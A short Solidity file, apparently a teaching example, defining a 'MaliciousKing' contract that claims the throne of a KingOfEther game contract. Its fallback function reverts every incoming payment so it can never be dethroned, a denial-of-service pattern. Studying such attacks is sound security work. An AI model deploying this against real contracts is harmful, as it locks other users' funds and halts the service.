// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./DOS.sol";

contract MaliciousKing {
    KingOfEther public kingOfEther;

    constructor(address _kingOfEtherAddress) {
        kingOfEther = KingOfEther(_kingOfEtherAddress);
    }

    function attack() external payable {
        require(msg.value > kingOfEther.balance(), "Need to pay more to become the king");
        kingOfEther.claimThrone{value: msg.value}();
    }

    fallback() external payable {
        revert("Denial of Service attack");
    }
}